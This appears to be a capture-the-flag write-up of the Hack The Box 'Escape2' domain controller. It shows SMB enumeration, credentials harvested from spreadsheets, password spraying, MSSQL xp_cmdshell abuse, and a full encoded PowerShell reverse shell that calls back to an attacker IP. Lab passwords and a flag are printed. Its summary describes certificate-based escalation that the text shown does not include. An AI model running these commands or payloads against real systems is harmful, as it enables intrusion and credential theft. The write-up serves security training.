# SUMMARY
This penetration test targeted the Escape2 machine on the Hack The Box platform, which was identified as a Domain Controller for the sequel.htb domain. The engagement began with network reconnaissance using an Nmap SYN scan with version detection and script scanning, which revealed several open ports including DNS, Kerberos, LDAP, SMB, and critically, Microsoft SQL Server on port 1433. The SQL Server instance was running on the Domain Controller itself under the context of a domain account, presenting a significant attack surface.

Initial access was achieved through credential compromise. Enumeration of the SMB service with NetExec using valid credentials for the user 'rose' revealed read access to a non-standard share named "Accounting Department." This share contained Excel files that, when analyzed, exposed plaintext credentials for multiple users, including the powerful SQL Server 'sa' account. Authentication to the SQL Server with these 'sa' credentials provided sysadmin-level access to the database instance.

Leveraging the xp_cmdshell stored procedure, which was enabled after reconfiguring the SQL Server settings, command execution was achieved on the underlying Windows host. This revealed the SQL Server service was running as the domain user 'sql_svc'. A PowerShell reverse shell was deployed through xp_cmdshell, establishing a persistent foothold on the Domain Controller. Further investigation of the file system uncovered the SQL Server configuration file containing the plaintext password for the 'sql_svc' domain account.

Password spraying attacks using the accumulated credentials successfully compromised additional user accounts, including 'oscar' and 'ryan'. BloodHound analysis of the domain revealed that the 'ryan' account possessed the WriteOwner and ForceChangePassword privileges over the 'ca_svc' service account. These privileges were exploited to take ownership of the 'ca_svc' account and grant full control permissions, enabling a Shadow Credentials attack. This technique added a Key Credential to the 'ca_svc' account, allowing authentication via certificate and subsequent extraction of the account's NT hash.

With access to the 'ca_svc' account, which was a member of the Cert Publishers group, Active Directory Certificate Services were enumerated. This revealed a vulnerable certificate template named 'DunderMifflinAuthentication' susceptible to ESC4 abuse. The template's permissions were modified to introduce ESC1 vulnerability characteristics, enabling the enrollment of a certificate for the Domain Administrator account. This certificate was then used to authenticate and retrieve the Domain Administrator's NT hash, resulting in complete domain compromise. The final proof of compromise was achieved by accessing the root flag on the Domain Controller's desktop, demonstrating full control over the domain infrastructure.

# NMAP

The command 'sudo nmap -sC -sV 10.129.32.26 --open' is executed with elevated privileges to perform an in-depth scan of the single target 10.129.32.26. The -sC flag runs scripts from the default Nmap script collection against the discovered open ports, which can detect common vulnerabilities or gather further information. The -sV flag probes open ports to determine the service name and version number. The --open switch filters the output to display only ports that are in an open state, streamlining the results. This command provides a detailed enumeration of the specific services running on the target, their versions, and potential security findings from the script checks, which is essential for identifying specific vulnerabilities and planning the subsequent exploitation phase.

```bash
sudo nmap -sC -sV  10.129.32.26  --open 
```

The provided Nmap scan results detail the open ports and services on the target host 10.129.32.26. Port 53 running a DNS service and port 88 running Kerberos, along with ports 389 and 636 for LDAP and secure LDAP, confirm this host is a Domain Controller. The hostname is identified as DC01.sequel.htb for the domain sequel.htb. Critically, port 1433 is open and running Microsoft SQL Server 2019. The Nmap script ms-sql-ntlm-info successfully authenticated to the SQL Server and retrieved the service account's Windows domain information, revealing that the SQL Server is running under a domain account on the Domain Controller itself. This configuration is a significant security finding as it indicates a potential for privilege escalation, where compromising the SQL Server could directly lead to a full domain compromise.

```output
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-09 10:38:09Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-09T10:39:29+00:00; +36s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:46:45
|_Not valid after:  2124-06-08T17:00:40
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-09T10:39:29+00:00; +36s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:46:45
|_Not valid after:  2124-06-08T17:00:40
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.32.26:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-11-09T10:39:29+00:00; +36s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.32.26:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb


```

The command 'nxc smb 10.129.32.26' uses NetExec to perform an enumeration check against the SMB service on the target host. The output confirms the host is a Domain Controller named DC01 for the domain sequel.htb, running a Windows Server 2019 operating system with Build 17763. A critical finding is that SMB signing is enabled and required on this host, which helps prevent relay attacks. This initial enumeration successfully gathered essential system and domain information without authentication, establishing a foothold for further targeted attacks.

```bash
nxc smb 10.129.32.26                                                   
SMB         10.129.32.26    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False) 
                                      
```

The command 'cat /etc/hosts' displays the local hostfile configuration. The output shows that static entries have been manually added to resolve the hostnames DC01, DC01.sequel.htb, and sequel.htb to the IP address 10.129.32.26. This configuration ensures that the attacker's machine can correctly resolve the domain and hostnames of the target during the penetration test, which is a necessary step for interacting with domain-joined services and performing further enumeration or exploitation.

```bash
cat  /etc/hosts
10.129.32.26    DC01  DC01.sequel.htb sequel.htb
```

The command 'nxc smb 10.129.32.26 -u 'rose' -p 'KxEPkKe6R8su' --users' successfully authenticates to the SMB service using the credentials for the user 'rose'. Upon successful authentication, the command enumerates the domain user accounts. The output lists nine users, including the default accounts Administrator, Guest, and krbtgt, as well as several custom user accounts such as michael, ryan, oscar, sql_svc, rose, and ca_svc. This successful enumeration confirms that the compromised user 'rose' has the necessary permissions to list domain users, providing a list of potential targets for further password spraying or brute-force attacks.

```bash
 nxc smb  10.129.32.26 -u 'rose' -p 'KxEPkKe6R8su' --users
SMB         10.129.32.26    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False) 
SMB         10.129.32.26    445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
SMB         10.129.32.26    445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.32.26    445    DC01             Administrator                 2024-06-08 16:32:20 0       Built-in account for administering the computer/domain 
SMB         10.129.32.26    445    DC01             Guest                         2024-12-25 14:44:53 0       Built-in account for guest access to the computer/domain 
SMB         10.129.32.26    445    DC01             krbtgt                        2024-06-08 16:40:23 0       Key Distribution Center Service Account 
SMB         10.129.32.26    445    DC01             michael                       2024-06-08 16:47:37 0        
SMB         10.129.32.26    445    DC01             ryan                          2024-06-08 16:55:45 0        
SMB         10.129.32.26    445    DC01             oscar                         2024-06-08 16:56:36 0        
SMB         10.129.32.26    445    DC01             sql_svc                       2024-06-09 07:58:42 0        
SMB         10.129.32.26    445    DC01             rose                          2024-12-25 14:44:54 0        
SMB         10.129.32.26    445    DC01             ca_svc                        2025-11-09 10:52:30 0        
SMB         10.129.32.26    445    DC01             [*] Enumerated 9 local users: SEQUEL
```

The command 'nxc smb 10.129.32.26 -u 'rose' -p 'KxEPkKe6R8su' --shares' successfully authenticates and enumerates the available SMB shares. The user 'rose' has READ permissions on several shares, including the non-standard 'Accounting Department' share, as well as the standard IPC$, NETLOGON, SYSVOL, and Users shares. The ADMIN$ and C$ administrative shares are visible but access was not granted, indicating limited privileges. The READ access on the 'Accounting Department' share is a significant finding as it is a custom share that may contain sensitive business data and could be a potential vector for information disclosure.

```bash
 nxc smb  10.129.32.26 -u 'rose' -p 'KxEPkKe6R8su' --shares
SMB         10.129.32.26    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False) 
SMB         10.129.32.26    445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
SMB         10.129.32.26    445    DC01             [*] Enumerated shares
SMB         10.129.32.26    445    DC01             Share           Permissions     Remark
SMB         10.129.32.26    445    DC01             -----           -----------     ------
SMB         10.129.32.26    445    DC01             Accounting Department READ            
SMB         10.129.32.26    445    DC01             ADMIN$                          Remote Admin
SMB         10.129.32.26    445    DC01             C$                              Default share
SMB         10.129.32.26    445    DC01             IPC$            READ            Remote IPC
SMB         10.129.32.26    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.32.26    445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.32.26    445    DC01             Users           READ      

```

The command uses smbclient to connect to the "Accounting Department" SMB share on the target host, authenticating as the user 'rose'. The connection is successful, and two files, accounting_2024.xlsx and accounts.xlsx, are identified and subsequently downloaded to the attacker's machine using the `get` command. This action successfully exfiltrates potential sensitive financial data or user account information from the share, confirming the information disclosure vulnerability and the user 'rose' having read access to business-critical files.

```bash
smbclient //10.129.32.26/"Accounting Department" -U rose -I 10.129.32.26


smb: \> get accounting_2024.xlsx
getting file \accounting_2024.xlsx of size 10217 as accounting_2024.xlsx (101.8 KiloBytes/sec) (average 101.8 KiloBytes/sec)
smb: \> get accounts.xlsx
getting file \accounts.xlsx of size 6780 as accounts.xlsx (49.8 KiloBytes/sec) (average 71.9 KiloBytes/sec)
smb: \> exit
                 

```

The commands first unzip the structure of the accounts.xlsx file and then display the contents of the sharedStrings.xml file, which contains the text strings used in the spreadsheet. The extracted data reveals a list of user credentials, including first names, last names, emails, usernames, and plaintext passwords. The most critical finding is the entry for the user 'sa' with the email 'sa@sequel.htb' and the password 'MSSQLP@ssw0rd!'. The username 'sa' is the default and highly privileged system administrator account for Microsoft SQL Server. These compromised credentials provide direct access to the SQL Server instance with the highest level of privileges.


```bash
unzip accounts.xlsx

kali㉿kali)-[~/Downloads/Escape2/xl]
└─$ cat  sharedStrings.xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="25" uniqueCount="24"><si><t xml:space="preserve">First Name</t></si><si><t xml:space="preserve">Last Name</t></si><si><t xml:space="preserve">Email</t></si><si><t xml:space="preserve">Username</t></si><si><t xml:space="preserve">Password</t></si><si><t xml:space="preserve">Angela</t></si><si><t xml:space="preserve">Martin</t></si><si><t xml:space="preserve">angela@sequel.htb</t></si><si><t xml:space="preserve">angela</t></si><si><t xml:space="preserve">0fwz7Q4mSpurIt99</t></si><si><t xml:space="preserve">Oscar</t></si><si><t xml:space="preserve">Martinez</t></si><si><t xml:space="preserve">oscar@sequel.htb</t></si><si><t xml:space="preserve">oscar</t></si><si><t xml:space="preserve">86LxLBMgEWaKUnBG</t></si><si><t xml:space="preserve">Kevin</t></si><si><t xml:space="preserve">Malone</t></si><si><t xml:space="preserve">kevin@sequel.htb</t></si><si><t xml:space="preserve">kevin</t></si><si><t xml:space="preserve">Md9Wlq1E5bZnVDVo</t></si><si><t xml:space="preserve">NULL</t></si><si><t xml:space="preserve">sa@sequel.htb</t></si><si><t xml:space="preserve">sa</t></si><si><t xml:space="preserve">MSSQLP@ssw0rd!</t></si></sst>                                                                                                                  
```

The commands display the contents of two files, 'passsword.txt' and 'users.txt', which have been compiled from previously gathered intelligence. The password file contains four unique plaintext passwords, including the critical 'MSSQLP@ssw0rd!' for the SQL Server 'sa' account. The users file is an aggregated list of all enumerated usernames from both the SMB user listing and the extracted Excel data, providing a comprehensive wordlist for credential-based attacks. These files are now prepared for use in automated password spraying or brute-forcing tools against various services on the network.

```bash
cat  passsword.txt
0fwz7Q4mSpurIt99
86LxLBMgEWaKUnBG 
Md9Wlq1E5bZnVDVo 
MSSQLP@ssw0rd!
                                                                                                                                                                                     
cat users.txt                             
Administrator
Guest  
krbtgt 
michael 
ryan   
oscar  
sql_svc
rose  
ca_svc 
angela
Martin
Martinez
Kevin
Malone
sa
```

The command 'nxc smb 10.129.32.26 -u users.txt -p passsword.txt --continue-on-success' performs a password spraying attack against the SMB service using the compiled lists of usernames and passwords. The attack successfully validates a new set of credentials. The user 'oscar' is successfully authenticated to the domain with the password '86LxLBMgEWaKUnBG'. This compromises a second domain user account, expanding the attacker's foothold within the environment.

```bash
nxc smb 10.129.32.26  -u users.txt -p passsword.txt   --continue-on-success

MB         10.129.32.26    445    DC01             [-] sequel.htb\michael:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.129.32.26    445    DC01             [-] sequel.htb\ryan:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.129.32.26    445    DC01             [-] sequel.htb\oscar:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.129.32.26    445    DC01             [-] sequel.htb\sql_svc:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.129.32.26    445    DC01             [-] sequel.htb\rose:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.129.32.26    445    DC01             [-] sequel.htb\ca_svc:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.129.32.26    445    DC01             [-] sequel.htb\angela:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.129.32.26    445    DC01             [-] sequel.htb\Martin:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.129.32.26    445    DC01             [-] sequel.htb\Martinez:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.129.32.26    445    DC01             [-] sequel.htb\Kevin:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.129.32.26    445    DC01             [-] sequel.htb\Malone:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.129.32.26    445    DC01             [-] sequel.htb\sa:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.129.32.26    445    DC01             [-] sequel.htb\Administrator:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
SMB         10.129.32.26    445    DC01             [-] sequel.htb\Guest:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
SMB         10.129.32.26    445    DC01             [-] sequel.htb\krbtgt:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
SMB         10.129.32.26    445    DC01             [-] sequel.htb\michael:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
SMB         10.129.32.26    445    DC01             [-] sequel.htb\ryan:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
SMB         10.129.32.26    445    DC01             [+] sequel.htb\oscar:86LxLBMgEWaKUnBG 

```

The command 'nxc mssql 10.129.32.26 -u sa -p MSSQLP@ssw0rd! --local-auth' successfully authenticates to the Microsoft SQL Server instance on the target using the compromised 'sa' credentials. The output confirms the authentication is successful and the connection is established with the highest level of privilege, as indicated by the (Pwn3d!) flag. This grants the attacker sysadmin-level control over the SQL Server instance, which is particularly critical because the server is running on the Domain Controller itself, creating a direct pathway for potential domain compromise.

```bash
nxc mssql  10.129.32.26  -u sa -p MSSQLP@ssw0rd!   --local-auth         
MSSQL       10.129.32.26    1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.129.32.26    1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
```

The command 'mssqlclient.py sa@DC01.sequel.htb' is executed, initiating a connection to the Microsoft SQL Server using the Impacket toolkit. After providing the password for the 'sa' account, a successful connection is established to the SQL Server instance named DC01\SQLEXPRESS. The connection is encrypted with TLS, and the initial database context is set to 'master'. The prompt 'SQL (sa dbo@master)>' confirms that the attacker now has an interactive command shell with sysadmin privileges, designated by the 'dbo' (database owner) role within the master database. This provides full control over the SQL Server instance.

```bash
mssqlclient.py  sa@DC01.sequel.htb                                                                          
Impacket v0.13.0.dev0+20250528.4535.5b338613 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (sa  dbo@master)> 


```

The initial attempt to execute the command 'EXEC xp_cmdshell 'whoami'' fails because the xp_cmdshell stored procedure is disabled by default. To enable it, the advanced options are first shown using 'EXEC sp_configure 'show advanced options' ,1;' followed by a RECONFIGURE command. Then, the xp_cmdshell component is explicitly enabled using 'EXEC sp_configure 'xp_cmdshell' ,1;' and activated with another RECONFIGURE command. This sequence of SQL commands successfully reconfigures the SQL Server instance to allow the execution of operating system commands, a critical step for privilege escalation.

```bash
SQL (sa  dbo@msdb)> EXEC xp_cmdshell whoami
ERROR(DC01\SQLEXPRESS): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
SQL (sa  dbo@msdb)> EXEC sp_configure 'show advanced options' ,1;
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.

SQL (sa  dbo@msdb)> RECONFIGURE;

SQL (sa  dbo@msdb)> EXEC sp_configure 'xp_cmdshell' ,1;
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@msdb)> RECONFIGURE;

```

The command 'EXEC xp_cmdshell 'whoami'' is executed successfully, confirming that the xp_cmdshell procedure is now enabled. The output reveals that the SQL Server service is running under the context of the Windows user 'sequel\sql_svc'. This demonstrates a successful breach of the database-to-operating system boundary, allowing for command execution on the underlying Windows host. The sql_svc account is a domain user, and its compromise is a significant finding as it can be leveraged for further lateral movement and privilege escalation within the domain.

```bash
SQL (sa  dbo@msdb)> EXEC xp_cmdshell whoami
output           
--------------   
sequel\sql_svc   



```

The command 'uv add --script hoaxshell.py -r requirements.txt' uses the uv package manager to install the hoaxshell.py script and its dependencies. The subsequent command 'uv run hoaxshell.py -s 10.10.16.16 -p 4444' executes the hoaxshell script, which starts a reverse shell server listening on the attacker's IP address 10.10.16.16 and port 4444. This sets up a listener designed to catch a connection from a compromised host, establishing a remote shell session for persistent access and further command execution.

```bash
uv add --script hoaxshell.py -r requirements.txt 
uv run  hoaxshell.py -s 10.10.16.16 -p 4444 

```

The command is a base64 encoded PowerShell one-liner. When decoded, it establishes a reverse shell connection back to the hoaxshell listener at IP address 10.10.16.16 on port 4444. This script uses the Invoke-WebRequest cmdlet to communicate with the listener, sending the output of executed commands and receiving new commands to run on the compromised host. This provides a persistent, interactive command and control channel on the target system, running in the context of the sql_svc user.

```output
powershell -e JABzAD0AJwAxADAALgAxADAALgAxADYALgAxADYAOgA0ADQANAA0ACcAOwAkAGkAPQAnADIAZABmAGYAOABlAGYAOAAtADYANAAyADkANQA4AGUAZgAtADgAOQA4ADcAZAAxADgANgAnADsAJABwAD0AJwBoAHQAdABwADoALwAvACcAOwAkAHYAPQBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAALQBVAHIAaQAgACQAcAAkAHMALwAyAGQAZgBmADgAZQBmADgAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0AYQA2AGEAMwAtAGUANwAyAGIAIgA9ACQAaQB9ADsAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQB7ACQAYwA9ACgASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8ANgA0ADIAOQA1ADgAZQBmACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtAGEANgBhADMALQBlADcAMgBiACIAPQAkAGkAfQApAC4AQwBvAG4AdABlAG4AdAA7AGkAZgAgACgAJABjACAALQBuAGUAIAAnAE4AbwBuAGUAJwApACAAewAkAHIAPQBpAGUAeAAgACQAYwAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwB0AG8AcAAgAC0ARQByAHIAbwByAFYAYQByAGkAYQBiAGwAZQAgAGUAOwAkAHIAPQBPAHUAdAAtAFMAdAByAGkAbgBnACAALQBJAG4AcAB1AHQATwBiAGoAZQBjAHQAIAAkAHIAOwAkAHQAPQBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJABwACQAcwAvADgAOQA4ADcAZAAxADgANgAgAC0ATQBlAHQAaABvAGQAIABQAE8AUwBUACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtAGEANgBhADMALQBlADcAMgBiACIAPQAkAGkAfQAgAC0AQgBvAGQAeQAgACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AEIAeQB0AGUAcwAoACQAZQArACQAcgApACAALQBqAG8AaQBuACAAJwAgACcAKQB9ACAAcwBsAGUAZQBwACAAMAAuADgAfQA=
```

The command 'EXEC xp_cmdshell' is used to execute the previously generated base64-encoded PowerShell payload on the target operating system. This command leverages the sysadmin privileges within SQL Server to spawn a process on the underlying Windows host, which in this case is the Domain Controller. The PowerShell script executes, establishing a reverse shell connection from the DC01 host back to the attacker's hoaxshell listener. This results in a remote code execution on the Domain Controller, providing the attacker with an interactive shell session running as the sql_svc domain user.

```bash
SQL (sa  dbo@msdb)> EXEC xp_cmdshell 'powershell -e JABzAD0AJwAxADAALgAxADAALgAxADYALgAxADYAOgA0ADQANAA0ACcAOwAkAGkAPQAnADIAZABmAGYAOABlAGYAOAAtADYANAAyADkANQA4AGUAZgAtADgAOQA4ADcAZAAxADgANgAnADsAJABwAD0AJwBoAHQAdABwADoALwAvACcAOwAkAHYAPQBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAALQBVAHIAaQAgACQAcAAkAHMALwAyAGQAZgBmADgAZQBmADgAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0AYQA2AGEAMwAtAGUANwAyAGIAIgA9ACQAaQB9ADsAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQB7ACQAYwA9ACgASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8ANgA0ADIAOQA1ADgAZQBmACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtAGEANgBhADMALQBlADcAMgBiACIAPQAkAGkAfQApAC4AQwBvAG4AdABlAG4AdAA7AGkAZgAgACgAJABjACAALQBuAGUAIAAnAE4AbwBuAGUAJwApACAAewAkAHIAPQBpAGUAeAAgACQAYwAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwB0AG8AcAAgAC0ARQByAHIAbwByAFYAYQByAGkAYQBiAGwAZQAgAGUAOwAkAHIAPQBPAHUAdAAtAFMAdAByAGkAbgBnACAALQBJAG4AcAB1AHQATwBiAGoAZQBjAHQAIAAkAHIAOwAkAHQAPQBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJABwACQAcwAvADgAOQA4ADcAZAAxADgANgAgAC0ATQBlAHQAaABvAGQAIABQAE8AUwBUACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtAGEANgBhADMALQBlADcAMgBiACIAPQAkAGkAfQAgAC0AQgBvAGQAeQAgACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AEIAeQB0AGUAcwAoACQAZQArACQAcgApACAALQBqAG8AaQBuACAAJwAgACcAKQB9ACAAcwBsAGUAZQBwACAAMAAuADgAfQA=' ;
```

The hoaxshell listener has successfully received a connection from the target host. The payload has been executed and the shell session has been stabilized. The command prompt shows the current working directory is 'C:\Windows\system32', indicating that the shell is operating with system-level access on the Windows host. This confirms a successful remote code execution and establishes a persistent command and control channel on the compromised Domain Controller.

```bash
[Shell] Payload execution verified!
[Shell] Stabilizing command prompt...

PS C:\Windows\system32 > 

```

The command 'type sql-Configuration.INI' displays the contents of the SQL Server installation configuration file. The file reveals the plaintext password 'WqSZAF6CysDQbGb3' for the service account 'SEQUEL\sql_svc' in the SQLSVCPASSWORD field. This is a critical finding as it exposes the domain password for the sql_svc account, which is already compromised. The file also confirms that the SQL Server was installed in mixed-mode authentication, with the sa account password set to 'MSSQLP@ssw0rd!', and that the SEQUEL\Administrator account is a SQL sysadmin.

```bash
PS C:\SQL2019\ExpressAdv_ENU > type sql-Configuration.INI 
[OPTIONS]
ACTION="Install"                                                                                                                                                                             
QUIET="True"                                                                                                                                                                                 
FEATURES=SQL                                                                                                                                                                                 
INSTANCENAME="SQLEXPRESS"                                                                                                                                                                    
INSTANCEID="SQLEXPRESS"                                                                                                                                                                      
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"                                                                                                                                            
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"                                                                                                                                                 
AGTSVCSTARTUPTYPE="Manual"                                                                                                                                                                   
COMMFABRICPORT="0"                                                                                                                                                                           
COMMFABRICNETWORKLEVEL=""0"                                                                                                                                                                  
COMMFABRICENCRYPTION="0"                                                                                                                                                                     
MATRIXCMBRICKCOMMPORT="0"                                                                                                                                                                    
SQLSVCSTARTUPTYPE="Automatic"                                                                                                                                                                
FILESTREAMLEVEL="0"                                                                                                                                                                          
ENABLERANU="False"                                                                                                                                                                           
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"                                                                                                                                                  
SQLSVCACCOUNT="SEQUEL\sql_svc"                                                                                                                                                               
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"                                                                                                                                                            
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"                                                                                                                                                   
SECURITYMODE="SQL"                                                                                                                                                                           
SAPWD="MSSQLP@ssw0rd!"                                                                                                                                                                       
ADDCURRENTUSERASSQLADMIN="False"                                                                                                                                                             
TCPENABLED="1"                                                                                                                                                                               
NPENABLED="1"                                                                                                                                                                                
BROWSERSVCSTARTUPTYPE="Automatic"                                                                                                                                                            
IAcceptSQLServerLicenseTerms=True                                                                                                                                                            
                                   

```

The command 'cat passsword.txt' displays the updated contents of the password file. The file now includes the newly discovered plaintext password 'WqSZAF6CysDQbGb3' for the sql_svc domain user account, which was extracted from the SQL Server configuration file. This password is added to the existing list of compromised credentials, expanding the attack surface for credential-based attacks against other services and users.

```bash
 cat passsword.txt 
0fwz7Q4mSpurIt99
86LxLBMgEWaKUnBG 
Md9Wlq1E5bZnVDVo 
MSSQLP@ssw0rd!
WqSZAF6CysDQbGb3

```

The command 'nxc winrm 10.129.32.26 -u users.txt -p passsword.txt --continue-on-success' performs a password spraying attack against the WinRM service. The attack successfully authenticates the user 'ryan' with the password 'WqSZAF6CysDQbGb3'. The (Pwn3d!) flag indicates that the credentials provide administrative access via WinRM, granting the attacker a privileged remote shell on the Domain Controller. This compromises a third domain user account with high privileges.

```bash
nxc winrm  10.129.32.26  -u users.txt -p passsword.txt   --continue-on-success

WINRM       10.129.32.26    5985   DC01             [-] sequel.htb\krbtgt:WqSZAF6CysDQbGb3
WINRM       10.129.32.26    5985   DC01             [-] sequel.htb\michael:WqSZAF6CysDQbGb3
WINRM       10.129.32.26    5985   DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 (Pwn3d!)
WINRM       10.129.32.26    5985   DC01          

```

The command 'evil-winrm -i 10.129.32.26 -u ryan -p WqSZAF6CysDQbGb3' establishes a remote PowerShell session with the target host using the compromised credentials for the user 'ryan'. The connection is successful, providing an interactive shell on the Domain Controller. The attacker navigates to the user's desktop directory and retrieves the contents of the user.txt file, which contains the flag '31fe365bf8d15e4da796abf5519de11a'. This confirms the compromise of the user 'ryan' and the ability to access user-specific data.

```bash
evil-winrm -i 10.129.32.26 -u ryan -p WqSZAF6CysDQbGb3 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ryan\Documents> cd ..
*Evil-WinRM* PS C:\Users\ryan> cd desktop
*Evil-WinRM* PS C:\Users\ryan\desktop> cat user.txt
31fe365bf8d15e4da796abf5519de11a
*Evil-WinRM* PS C:\Users\ryan\desktop> 


```

